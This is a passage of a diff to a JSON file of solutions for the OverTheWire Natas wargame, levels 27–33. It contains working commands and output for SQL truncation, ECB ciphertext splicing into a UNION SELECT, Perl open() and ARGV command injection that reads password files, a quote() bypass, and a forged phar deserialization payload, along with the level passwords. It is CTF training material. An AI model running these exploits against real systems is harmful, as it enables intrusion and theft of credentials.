+      "$query = \"SELECT username from users where username='$user' and password='$password' \";",
+      "$query = \"SELECT * from users where username='$user'\";",
+      "$user=mysqli_real_escape_string($link, trim($usr));",
+      "$query = \"SELECT * from users where username='$user'\";",
+      "if($usr != trim($usr)) {",
+      "$user=mysqli_real_escape_string($link, substr($usr, 0, 64));",
+      "$password=mysqli_real_escape_string($link, substr($pass, 0, 64));",
+      "$query = \"INSERT INTO users (username,password) values ('$user','$password')\";"
+     ]
+    },
+    {
+     "cmd": "python3 - <<'PY'\nimport urllib.request, urllib.parse, base64, re\nauth = \"Basic \" + base64.b64encode(b\"natas27:mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV\").decode()\nH = \"http://natas27.natas.labs.overthewire.org/\"\ndef post(usr, pw):\n    d = urllib.parse.urlencode({\"username\": usr, \"password\": pw}).encode()\n    b = urllib.request.urlopen(urllib.request.Request(H, data=d, headers={\"Authorization\": auth}), timeout=10).read().decode(\"utf-8\",\"replace\")\n    return b[b.find('<div id=\"content\">'):]\nreg = \"natas28\" + \" \" * 57 + \"x\"\nlogin = \"natas28\" + \" \" * 57\nprint(\"register username='natas28'+57sp+'x' (65 chars), password=''\")\nprint(\"  \", re.sub('<[^>]+>',' ',post(reg, \"\"))[:200].strip())\nprint(\"login    username='natas28'+57sp (64 chars), password=''\")\nprint(\"  \", re.sub('<[^>]+>',' ',post(login, \"\"))[:400].strip())\nPY",
+     "out": [
+      "register username='natas28'+57sp+'x' (65 chars), password=''",
+      "   User natas28                                                         x was created!  View sourcecode",
+      "login    username='natas28'+57sp (64 chars), password=''",
+      "   Welcome natas28                                                         ! Here is your data: Array",
+      "(",
+      "    [username] =&gt; natas28",
+      "    [password] =&gt; Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3",
+      ")",
+      "  View sourcecode"
+     ]
+    }
+   ]
   },
   {
    "lvl": 28,
    "user": "natas28",
-   "cmds": [
-    [
-     "# the search query is escaped, then encrypted (ECB) into the SQL itself \u2014 typed quotes stay escaped",
-     "# block size 16; diffing ciphertexts shows the input begins at plaintext byte 38",
-     "# donor query: 9 filler chars put the escaped quote exactly on a block boundary\u2026",
-     "curl -s -i -u natas28:PASS 'http://natas28.natas.labs.overthewire.org/index.php?query=BBBBBBBBB%27%20UNION%20SELECT%20password%20FROM%20users%20--%20ZZZ'",
-     "# \u2026lift blocks 3-5 (they decrypt to: ' UNION SELECT / password FROM us / ers --) and splice:",
-     "# final = head blocks of a benign query + payload blocks + donor tail (keeps padding valid)",
-     "curl -s -u natas28:PASS 'http://natas28.natas.labs.overthewire.org/search.php/?query=<spliced base64>'"
-    ]
-   ],
-   "out": [
-    "Whack Computer Joke Database",
-    "(one of the 'jokes' listed is the password row)"
-   ],
-   "pw": "hwgoYUiGWoSZAqphtCAZf7u1jS16KEah"
+   "pw": "hwgoYUiGWoSZAqphtCAZf7u1jS16KEah",
+   "steps": [
+    {
+     "cmd": "python3 - <<'PY'\nimport urllib.request, urllib.parse, base64, urllib.error\nauth = \"Basic \" + base64.b64encode(b\"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3\").decode()\nclass NR(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl): return None\nop = urllib.request.build_opener(NR)\ndef ct_for(q):\n    d = urllib.parse.urlencode({\"query\": q}).encode()\n    try:\n        r = op.open(urllib.request.Request(\"http://natas28.natas.labs.overthewire.org/index.php\", data=d, headers={\"Authorization\": auth}), timeout=10)\n        loc = r.headers.get(\"Location\")\n    except urllib.error.HTTPError as e:\n        loc = e.headers.get(\"Location\")\n    return base64.b64decode(urllib.parse.unquote(loc.split(\"query=\")[1]))\nprint(\"ciphertext length vs query length (16-byte blocks => ECB):\")\nfor n in range(0, 17):\n    raw = ct_for(\"a\" * n)\n    print(\"   a*%-2d -> %3d bytes (%d blocks)\" % (n, len(raw), len(raw) // 16))\nraw = ct_for(\"A\" * 64)\nprint(\"identical plaintext blocks encrypt identically (ECB fingerprint):\")\nprint(\"   A*64 ->\", [raw[i:i+16].hex()[:12] for i in range(0, len(raw), 16)])\nprint(\"where our input starts: 'a'*8 and 'a'*12 share block 2, 13 changes it\")\nfor n in (8, 12, 13):\n    raw = ct_for(\"a\" * n)\n    print(\"   a*%-2d ->\" % n, [raw[i:i+16].hex()[:12] for i in range(0, len(raw), 16)])\nPY",
+     "out": [
+      "ciphertext length vs query length (16-byte blocks => ECB):",
+      "   a*0  ->  80 bytes (5 blocks)",
+      "   a*1  ->  80 bytes (5 blocks)",
+      "   a*2  ->  80 bytes (5 blocks)",
+      "   a*3  ->  80 bytes (5 blocks)",
+      "   a*4  ->  80 bytes (5 blocks)",
+      "   a*5  ->  80 bytes (5 blocks)",
+      "   a*6  ->  80 bytes (5 blocks)",
+      "   a*7  ->  80 bytes (5 blocks)",
+      "   a*8  ->  80 bytes (5 blocks)",
+      "   a*9  ->  80 bytes (5 blocks)",
+      "   a*10 ->  80 bytes (5 blocks)",
+      "   a*11 ->  80 bytes (5 blocks)",
+      "   a*12 ->  80 bytes (5 blocks)",
+      "   a*13 ->  96 bytes (6 blocks)",
+      "   a*14 ->  96 bytes (6 blocks)",
+      "   a*15 ->  96 bytes (6 blocks)",
+      "   a*16 ->  96 bytes (6 blocks)",
+      "identical plaintext blocks encrypt identically (ECB fingerprint):",
+      "   A*64 -> ['1be82511a7ba', 'dc84728fdcf8', '5f22a727f625', 'f633e6b05f86', 'f633e6b05f86', 'f633e6b05f86', 'e3df361c6393', 'a77e8ed1aabe', '478eb1a1fe26']",
+      "where our input starts: 'a'*8 and 'a'*12 share block 2, 13 changes it",
+      "   a*8  -> ['1be82511a7ba', 'dc84728fdcf8', '453e0020602f', '896de90884f8', '917232051483']",
+      "   a*12 -> ['1be82511a7ba', 'dc84728fdcf8', 'c0872dee8bc9', 'ce82a9553b65', '75fd5044fd06']",
+      "   a*13 -> ['1be82511a7ba', 'dc84728fdcf8', 'c0872dee8bc9', '1f74714d76fc', '6223a14d9c42', 'd8ae51d7da71']"
+     ]
+    },
+    {
+     "cmd": "python3 - <<'PY'\nimport urllib.request, urllib.parse, base64, urllib.error\nauth = \"Basic \" + base64.b64encode(b\"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3\").decode()\nclass NR(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl): return None\nop = urllib.request.build_opener(NR)\ndef ct_for(q):\n    d = urllib.parse.urlencode({\"query\": q}).encode()\n    try:\n        r = op.open(urllib.request.Request(\"http://natas28.natas.labs.overthewire.org/index.php\", data=d, headers={\"Authorization\": auth}), timeout=10)\n        loc = r.headers.get(\"Location\")\n    except urllib.error.HTTPError as e:\n        loc = e.headers.get(\"Location\")\n    return base64.b64decode(urllib.parse.unquote(loc.split(\"query=\")[1]))\ndef get_ct(raw):\n    u = \"http://natas28.natas.labs.overthewire.org/search.php/?query=\" + urllib.parse.quote(base64.b64encode(raw).decode())\n    return op.open(urllib.request.Request(u, headers={\"Authorization\": auth}), timeout=10).read().decode(\"utf-8\",\"replace\")\nbase = ct_for(\"a\" * 8)\nb = [base[i:i+16] for i in range(0, len(base), 16)]\nprint(\"base blocks:\", [x.hex()[:12] for x in b])\nfor payload in [\" UNION SELECT 1-- \", \" UNION SELECT password FROM users-- \"]:\n    q2 = \"b\" * 10 + payload\n    r2 = ct_for(q2)\n    b2 = [r2[i:i+16] for i in range(0, len(r2), 16)]\n    print(\"payload:\", repr(payload))\n    print(\"payload blocks:\", [x.hex()[:12] for x in b2])\n    spliced = b[0] + b[1] + b[2] + b\"\".join(b2[3:])\n    body = get_ct(spliced)\n    i = body.find(\"<ul>\"); j = body.find(\"</ul>\", i)\n    print(\"result:\", body[i+4:j].strip()[:200])\nPY",
+     "out": [
+      "base blocks: ['1be82511a7ba', 'dc84728fdcf8', '453e0020602f', '896de90884f8', '917232051483']",
+      "payload: ' UNION SELECT 1-- '",
+      "payload blocks: ['1be82511a7ba', 'dc84728fdcf8', '5c805cbd29fb', 'bd122ab77244', '8afe54e01055', '75fd5044fd06']",
+      "result: <li>1</li>",
+      "payload: ' UNION SELECT password FROM users-- '",
+      "payload blocks: ['1be82511a7ba', 'dc84728fdcf8', '5c805cbd29fb', '49c7ba591489', '043003a0d0e6', '91f8d230c184', '4257a343daad', '7b7baca655f2']",
+      "result: <li>hwgoYUiGWoSZAqphtCAZf7u1jS16KEah</li>"
+     ]
+    }
+   ]
   },
   {
    "lvl": 29,
    "user": "natas29",
-   "cmds": [
-    [
-     "# index.pl feeds 'file' to a Perl two-arg open \u2014 a leading | makes it a shell pipeline",
-     "# but any parameter containing the word natas is silently dropped, so split it with quotes:",
-     "curl -s -u natas29:PASS --get --data-urlencode 'file=| cat \"/etc/nata\"\"s_webpa\"\"ss/nata\"\"s30\" | tr '\\n' ' '' http://natas29.natas.labs.overthewire.org/index.pl"
-    ]
-   ],
-   "out": [
-    "(the password file's contents, printed as the 'poem')"
-   ],
-   "pw": "frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF"
+   "pw": "frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah http://natas29.natas.labs.overthewire.org/ | grep -o \"href=[^>]*\"",
+     "out": [
+      "href=\"http://natas.labs.overthewire.org/css/level.css\"",
+      "href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /",
+      "href=\"http://natas.labs.overthewire.org/css/wechall.css\" /"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|cat /var/www/n?tas/n?tas29/index.pl;' http://natas29.natas.labs.overthewire.org/index.pl | grep -a \"param('file')\\|open(FD\\|=~/natas\\|escapeHTML\"",
+     "out": [
+      "if(param('file')){",
+      "    $f=param('file');",
+      "    if($f=~/natas/){",
+      "        open(FD, \"$f.txt\");",
+      "            print CGI::escapeHTML($_);"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|id;' http://natas29.natas.labs.overthewire.org/index.pl | grep -a '^uid='",
+     "out": [
+      "uid=30029(natas29) gid=30029(natas29) groups=30029(natas29)"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|ls;' http://natas29.natas.labs.overthewire.org/index.pl | grep -av '^<\\|^$\\|^  \\|^<!'",
+     "out": [
+      "#content {",
+      "}",
+      "pre{",
+      "} ",
+      "H3y K1dZ,<br>",
+      "y0 rEm3mB3rz p3Rl rit3?<br>",
+      "\\/\\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>",
+      "index.pl",
+      "perl underground 2.txt",
+      "perl underground 3.txt",
+      "perl underground 4.txt",
+      "perl underground 5.txt",
+      "perl underground.txt"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|cat /etc/n?tas_webpass/n?tas30;' http://natas29.natas.labs.overthewire.org/index.pl | grep -a '^[A-Za-z0-9]\\{32\\}$'",
+     "out": [
+      "frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF"
+     ]
+    }
+   ]
   },
   {
    "lvl": 30,
    "user": "natas30",
-   "cmds": [
-    [
-     "# the Perl login builds SQL with $dbh->quote(param('password'))",
-     "# send the parameter TWICE: quote() then gets (value, type) and a numeric type means 'return unquoted':",
-     "curl -s -u natas30:PASS -X POST http://natas30.natas.labs.overthewire.org/index.pl --data-urlencode 'username=natas31' --data-urlencode \"password='' or 1\" --data-urlencode 'password=2'"
-    ]
-   ],
-   "out": [
-    "win! here is your result: natas31<password>"
-   ],
-   "pw": "aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z"
+   "pw": "aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF http://natas30.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\\\"/g; s/&#39;/'/g\" | grep -aE \"query=|quote\\(param|prepare|execute\" | head -6",
+     "out": [
+      "    my $query=\"Select * FROM users where username =\".$dbh->quote(param('username')) . \" and password =\".$dbh->quote(param('password')); ",
+      "    my $sth = $dbh->prepare($query);",
+      "    $sth->execute();"
+     ]
+    },
+    {
+     "cmd": "echo \"repeated password (quote type argument = SQL_INTEGER):\"\ncurl -s -u natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF -d 'username=natas31' -d 'password=1 OR 1=1' -d 'password=4' http://natas30.natas.labs.overthewire.org/index.pl | sed \"s/<[^>]*>//g\" | grep -aE \"win|fail\"\necho \"single password (a string, escaped):\"\ncurl -s -u natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF -d 'username=natas31' -d 'password=1 OR 1=1' http://natas30.natas.labs.overthewire.org/index.pl | sed \"s/<[^>]*>//g\" | grep -aE \"win|fail\"",
+     "out": [
+      "repeated password (quote type argument = SQL_INTEGER):",
+      "win!here is your result:natas31aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1zView sourcecode",
+      "single password (a string, escaped):",
+      "fail :(View sourcecode"
+     ]
+    }
+   ]
   },
   {
    "lvl": 31,
    "user": "natas31",
-   "cmds": [
-    [
-     "# index.pl: if upload('file') passes, it does  $file = param('file');  while (<$file>) { print rows }",
-     "# param() returns the FIRST 'file' value; upload() only needs SOME part to be a real upload.",
-     "# Send a plain field first (value: ARGV), then the real CSV \u2014 and put a command in the URL:",
-     "curl -s -u natas31:PASS -F 'file=ARGV' -F 'file=@tiny.csv;type=text/csv' 'http://natas31.natas.labs.overthewire.org/index.pl?/bin/cat%20/etc/natas_webpass/natas32%20|'",
-     "# <$file> is now <ARGV>: the diamond operator open()s the query-string 'filename' \u2014 trailing | makes it a command"
-    ]
-   ],
-   "out": [
-    "(the command's output, rendered as table cells)"
-   ],
-   "pw": "Rc3837d6qd3KoW0R2IgKssMXRX06btgY"
+   "pw": "Rc3837d6qd3KoW0R2IgKssMXRX06btgY",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z http://natas31.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\\\"/g; s/&#39;/'/g\" | grep -aE \"upload|param|while|split\" | head -5",
+     "out": [
+      "if ($cgi->upload('file')) {",
+      "    my $file = $cgi->param('file');",
+      "    while (<$file>) {",
+      "        my @elements=split /,/, $_;",
+      "    Select file to upload:"
+     ]
+    },
+    {
+     "cmd": "printf 'a,b\\nc,d\\n' > /tmp/t.csv\ncat /tmp/t.csv",
+     "out": [
+      "a,b",
+      "c,d"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z -F \"file=ARGV\" -F \"file=@/tmp/t.csv\" \"http://natas31.natas.labs.overthewire.org/index.pl?/etc/hostname\" | sed -n \"/<table/,/<\\/table>/p\"",
+     "out": [
+      "<table class=\"sortable table table-hover table-striped\"><tr><th>natas-0",
+      "</th></tr></table><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z -F \"file=ARGV\" -F \"file=@/tmp/t.csv\" \"http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32\" | sed -n \"/<table/,/<\\/table>/p\"",
+     "out": [
+      "<table class=\"sortable table table-hover table-striped\"><tr><th>Rc3837d6qd3KoW0R2IgKssMXRX06btgY",
+      "</th></tr></table><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>"
+     ]
+    }
+   ]
   },
   {
    "lvl": 32,
    "user": "natas32",
-   "cmds": [
-    [
-     "# identical viewer code to natas31 \u2014 same ARGV + diamond-operator trick\u2026",
-     "curl -s -u natas32:PASS -F 'file=ARGV' -F 'file=@tiny.csv;type=text/csv' 'http://natas32.natas.labs.overthewire.org/index.pl?ls%20-la%20|'",
-     "# \u2026but the password file itself is not readable by the web user this time.",
-     "# the webroot ships a helper binary for exactly that \u2014 execute it instead:",
-     "curl -s -u natas32:PASS -F 'file=ARGV' -F 'file=@tiny.csv;type=text/csv' 'http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|'"
-    ]
-   ],
-   "out": [
-    "(the helper prints the natas33 password)"
-   ],
-   "pw": "kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL"
+   "pw": "kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY http://natas32.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\\\"/g; s/&#39;/'/g\" | grep -aE \"upload\\(|param\\(|while|split|code exec\" | head -6",
+     "out": [
+      "if ($cgi->upload('file')) {",
+      "    my $file = $cgi->param('file');",
+      "    while (<$file>) {",
+      "        my @elements=split /,/, $_;",
+      "    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute."
+     ]
+    },
+    {
+     "cmd": "printf 'a,b\\nc,d\\n' > /tmp/t.csv\ncat /tmp/t.csv",
+     "out": [
+      "a,b",
+      "c,d"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY -F \"file=ARGV\" -F \"file=@/tmp/t.csv\" \"http://natas32.natas.labs.overthewire.org/index.pl?/bin/ls%20%23%7C\" | sed -n \"/<table/,/<\\/table>/p\"",
+     "out": [
+      "<table class=\"sortable table table-hover table-striped\"><tr><th>bootstrap-3.3.6-dist",
+      "</th></tr><tr><td>getpassword",
+      "</td></tr><tr><td>index-source.html",
+      "</td></tr><tr><td>index.pl",
+      "</td></tr><tr><td>jquery-1.12.3.min.js",
+      "</td></tr><tr><td>sorttable.js",
+      "</td></tr><tr><td>tmp",
+      "</td></tr></table><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY -F \"file=ARGV\" -F \"file=@/tmp/t.csv\" \"http://natas32.natas.labs.overthewire.org/index.pl?/bin/ls%20-la%20/var/www/natas/natas32/getpassword%20%23%7C\" | sed -n \"/<table/,/<\\/table>/p\"",
+     "out": [
+      "<table class=\"sortable table table-hover table-striped\"><tr><th>-rwsrwx--- 1 root natas32 16088 Oct 25 13:23 /var/www/natas/natas32/getpassword",
+      "</th></tr></table><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY -F \"file=ARGV\" -F \"file=@/tmp/t.csv\" \"http://natas32.natas.labs.overthewire.org/index.pl?/var/www/natas/natas32/getpassword%20%23%7C\" | sed -n \"/<table/,/<\\/table>/p\"",
+     "out": [
+      "<table class=\"sortable table table-hover table-striped\"><tr><th>kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL",
+      "</th></tr></table><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>"
+     ]
+    }
+   ]
   },
   {
    "lvl": 33,
    "user": "natas33",
-   "cmds": [
-    [
-     "# Executor::__destruct runs 'php <filename>' when md5_file(filename) == signature",
-     "# 1) upload a shell and note its real md5; 2) upload a tiny Phar whose METADATA is a forged",
-     "#    Executor(filename='shell.php', signature=<that md5>); 3) submit any upload with:",
-     "curl -s -u natas33:PASS -F 'filename=shell.php' -F 'uploadedfile=@shell.php' http://natas33.natas.labs.overthewire.org/index.php",
-     "curl -s -u natas33:PASS -F 'filename=evil.phar' -F 'uploadedfile=@evil.phar' http://natas33.natas.labs.overthewire.org/index.php",
-     "curl -s -u natas33:PASS -F 'filename=phar:///natas33/upload/evil.phar/x.txt' -F 'uploadedfile=@tiny.csv' http://natas33.natas.labs.overthewire.org/index.php",
-     "# md5_file() on the phar:// path unserializes the metadata \u2014 the forged Executor's destructor runs the shell"
-    ]
-   ],
-   "out": [
-    "Congratulations! Running firmware update: shell.php"
-   ],
-   "pw": "cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK"
+   "pw": "cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL http://natas33.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\\\"/g\" | tr -d \"\\n\" | sed \"s/    /\\n/g\" | grep -aE \"class Executor|private \\$|md5_file|passthru|move_uploaded_file\" | head -8",
+     "out": [
+      "class Executor{",
+      "if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], \"/natas33/upload/\" . $this->filename)) {",
+      "if(md5_file($this->filename) == $this->signature){",
+      "passthru(\"php \" . $this->filename);"
+     ]
+    },
+    {
+     "cmd": "printf '<?php echo file_get_contents(\"/etc/natas_webpass/natas34\"); ?>' > /tmp/n33payload.php\nmd5sum /tmp/n33payload.php",
+     "out": [
+      "8a54d751b7e2bbbb2643d355d49e81be  /tmp/n33payload.php"
+     ]
+    },
+    {
+     "cmd": "python3 - <<'PY'\nimport struct, zlib, hashlib\npayload = open('/tmp/n33payload.php','rb').read()\nmd5 = hashlib.md5(payload).hexdigest()\nSTUB = b\"<?php __HALT_COMPILER(); ?>\\r\\n\"\nk = b\"\\x00Executor\\x00\"\nmeta  = b'O:8:\"Executor\":3:{'\nmeta += b's:%d:\"%sfilename\";s:%d:\"/tmp/n33payload.php\";' % (len(k+b\"filename\"), k, len(\"/tmp/n33payload.php\"))\nmeta += b's:%d:\"%ssignature\";s:32:\"%s\";' % (len(k+b\"signature\"), k, md5.encode())\nmeta += b's:%d:\"%sinit\";b:0;}' % (len(k+b\"init\"), k)\nm  = struct.pack(\"<I\", 1)\nm += struct.pack(\"<H\", 0x11)\nm += struct.pack(\"<I\", 0x10000)\nm += struct.pack(\"<I\", 0)\nm += struct.pack(\"<I\", len(meta)) + meta\nm += struct.pack(\"<I\", 1) + b\"x\"\nm += struct.pack(\"<I\", 1) + struct.pack(\"<I\", 0) + struct.pack(\"<I\", 1)\nm += struct.pack(\"<I\", zlib.crc32(b\"x\") & 0xFFFFFFFF)\nm += struct.pack(\"<I\", 0x1A4) + struct.pack(\"<I\", 0)\nout = STUB + struct.pack(\"<I\", len(m)) + m + b\"x\"\nout += hashlib.sha1(out).digest() + struct.pack(\"<I\", 2) + b\"GBMB\"\nopen('/tmp/n33r.phar','wb').write(out)\nprint(\"payload md5=%s -> /tmp/n33r.phar (%d bytes)\" % (md5, len(out)))\nPY",
+     "out": [
+      "payload md5=8a54d751b7e2bbbb2643d355d49e81be -> /tmp/n33r.phar (274 bytes)"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL -F \"filename=../../../tmp/n33payload.php\" -F \"uploadedfile=@/tmp/n33payload.php\" http://natas33.natas.labs.overthewire.org/index.php | sed \"s/<[^>]*>//g\" | grep -a \"uploaded\"\ncurl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL -F \"filename=../../../tmp/n33r.phar\" -F \"uploadedfile=@/tmp/n33r.phar\" http://natas33.natas.labs.overthewire.org/index.php | sed \"s/<[^>]*>//g\" | grep -a \"uploaded\"",
+     "out": [
+      "            The update has been uploaded to: /natas33/upload/../../../tmp/n33payload.phpFirmware upgrad initialised.Failur! MD5sum mismatch!            ",
+      "            The update has been uploaded to: /natas33/upload/../../../tmp/n33r.pharFirmware upgrad initialised.Failur! MD5sum mismatch!            "
+     ]
+    },
+    {
+     "cmd": "printf 'x' > /tmp/h.txt\ncurl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL -F \"filename=phar:///tmp/n33r.phar\" -F \"uploadedfile=@/tmp/h.txt\" http://natas33.natas.labs.overthewire.org/index.php | sed \"s/<[^>]*>//g\" | grep -aE \"Congratulations|Running|natas34|Failur\" | tail -2",
+     "out": [
+      "Failur! MD5sum mismatch!            ",
+      "Congratulations! Running firmware update: /tmp/n33payload.php cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK"
+     ]
+    }
+   ]
   }
  ],
  "goals": {
   "0": "The password is right in the page source.",
-  "1": "Right-click is blocked by JavaScript \u2014 but only in a browser.",
+  "1": "Right-click is blocked by JavaScript — but only in a browser.",
   "2": "The page loads an image from a browsable /files/ directory.",
-  "3": "Even Google won't find this one \u2014 but robots.txt talks.",
+  "3": "Even Google won't find this one — but robots.txt talks.",
   "4": "Access is granted only to visitors referred from the natas5 site.",
   "5": "Login state lives in a cookie you control.",
   "6": "The source code reveals a secret stored in an include file.",
@@ -536,28 +1033,28 @@
   "8": "The secret is 'encoded' in the source: bin2hex(strrev(base64(x))). Encoding is not encryption.",
   "9": "A search form feeds your input straight into a grep command.",
   "10": "Same form, but ; | & are filtered now. Spaces and grep's file arguments are not.",
-  "11": "The 'data' cookie is base64 of a repeating-key XOR of known JSON \u2014 recover the key and forge an admin cookie.",
+  "11": "The 'data' cookie is base64 of a repeating-key XOR of known JSON — recover the key and forge an admin cookie.",
   "12": "An upload form keeps your file's .php extension.",
-  "13": "The upload now checks the file type with exif_imagetype \u2014 so make the PHP look like a GIF.",
+  "13": "The upload now checks the file type with exif_imagetype — so make the PHP look like a GIF.",
   "14": "A login form builds its SQL query with your username inside it.",
-  "15": "The form only says whether a user exists \u2014 a blind SQL injection oracle. Brute-force the password through it.",
-  "16": "The dictionary search filters shell metacharacters but not $() command substitution \u2014 turn it into a yes/no oracle and extract the password character by character.",
-  "17": "Same injectable user check as before, but every line of output is commented out \u2014 the only remaining channel is response time.",
-  "18": "Admin login is disabled, but sessions are numbered with rand(1, 640) \u2014 try every session id until you find the admin's live session.",
-  "19": "Session ids are now hex-encoded '<number>-<username>' strings \u2014 forge candidate ids for the username 'admin' and find the live one.",
-  "20": "A custom session handler stores each key as a raw 'key value' line \u2014 smuggle a newline into your name and you can write extra keys into your own session.",
-  "21": "Two colocated sites share one session store; the harmless-looking style experimenter writes any submitted field into the session \u2014 including 'admin'.",
-  "22": "The answer is sent and then hidden behind a redirect \u2014 read the redirect response itself instead of following it.",
-  "23": "The password check mixes a substring test with a numeric comparison \u2014 PHP's loose typing lets one string be both.",
-  "24": "The login compares your input with strcmp() \u2014 feed it an array and the comparison errors out in your favor.",
-  "25": "A 'safe' include strips ../ and bans the password path by name \u2014 but it logs your User-Agent to an includable file, and the strip itself can be folded back into a traversal.",
-  "26": "A drawing cookie is unserialized without checks \u2014 inject a crafted object whose destructor writes a file of your choosing.",
-  "27": "Registration truncates names to 64 characters while the data dump trims them \u2014 a padded lookalike account makes the dump hand you the real user's row.",
-  "28": "The query is escaped and then ECB-encrypted into the backend SQL \u2014 cut ciphertext blocks from a donor query and splice in an unescaped UNION SELECT.",
-  "29": "A Perl open() treats the chosen 'file' as a shell pipeline \u2014 and the one word the filter bans can be smuggled past it inside shell quotes.",
-  "30": "The login quotes parameters 'safely' \u2014 unless a parameter arrives twice, which silently switches quote() into its unquoted numeric mode.",
-  "31": "A CSV viewer reads lines from a user-named handle \u2014 name it ARGV and the 'file' it iterates is your URL, pipe and all.",
+  "15": "The form only says whether a user exists — a blind SQL injection oracle. Brute-force the password through it.",
+  "16": "The dictionary search filters shell metacharacters but not $() command substitution — turn it into a yes/no oracle and extract the password character by character.",
+  "17": "Same injectable user check as before, but every line of output is commented out — the only remaining channel is response time.",
+  "18": "Admin login is disabled, but sessions are numbered with rand(1, 640) — try every session id until you find the admin's live session.",
+  "19": "Session ids are now hex-encoded '<number>-<username>' strings — forge candidate ids for the username 'admin' and find the live one.",
+  "20": "A custom session handler stores each key as a raw 'key value' line — smuggle a newline into your name and you can write extra keys into your own session.",
+  "21": "Two colocated sites share one session store; the harmless-looking style experimenter writes any submitted field into the session — including 'admin'.",
+  "22": "The answer is sent and then hidden behind a redirect — read the redirect response itself instead of following it.",
+  "23": "The password check mixes a substring test with a numeric comparison — PHP's loose typing lets one string be both.",
+  "24": "The login compares your input with strcmp() — feed it an array and the comparison errors out in your favor.",
+  "25": "A 'safe' include strips ../ and bans the password path by name — but it logs your User-Agent to an includable file, and the strip itself can be folded back into a traversal.",
+  "26": "A drawing cookie is unserialized without checks — inject a crafted object whose destructor writes a file of your choosing.",
+  "27": "Registration truncates names to 64 characters while the data dump trims them — a padded lookalike account makes the dump hand you the real user's row.",
+  "28": "The query is escaped and then ECB-encrypted into the backend SQL — cut ciphertext blocks from a donor query and splice in an unescaped UNION SELECT.",
+  "29": "A Perl open() treats the chosen 'file' as a shell pipeline — and the one word the filter bans can be smuggled past it inside shell quotes.",
+  "30": "The login quotes parameters 'safely' — unless a parameter arrives twice, which silently switches quote() into its unquoted numeric mode.",
+  "31": "A CSV viewer reads lines from a user-named handle — name it ARGV and the 'file' it iterates is your URL, pipe and all.",
   "32": "Same ARGV flaw, one twist: the flag file is unreadable, so run the privileged helper binary the level provides instead of reading the file.",
